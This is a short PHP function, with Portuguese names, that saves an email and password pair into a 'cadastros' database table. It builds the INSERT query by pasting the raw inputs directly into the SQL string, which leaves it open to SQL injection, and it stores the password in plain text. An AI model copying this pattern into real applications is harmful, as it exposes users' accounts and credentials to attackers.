<?php
$ultimo_email = "";

function enviar_banco($mysqli,$email, $senha){
    global $ultimo_email;
    if ($ultimo_email != $email){
        $ultimo_email = $email;
        $inserir = "INSERT INTO cadastros (Email, Senha) VALUES ('$email', '$senha')";
        $result = mysqli_query($mysqli, $inserir);
    }
}